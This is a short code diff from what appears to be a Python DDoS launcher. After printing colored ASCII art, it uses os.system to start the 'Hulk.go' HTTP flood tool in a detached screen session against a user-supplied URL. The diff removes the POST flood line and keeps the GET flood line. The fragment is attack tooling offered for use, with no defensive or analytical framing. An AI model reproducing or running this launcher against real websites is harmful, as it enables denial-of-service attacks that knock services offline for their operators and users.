@@ -377,7 +377,6 @@ def main():
 ⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
 """)
                     os.system(f'cd l7 && screen -dm go run Hulk.go -site {url} {duration} -data GET')
-                    os.system(f'cd l7 && screen -dm go run Hulk.go -site {url} {duration} -data POST')
                     
             except ValueError:
                 main()
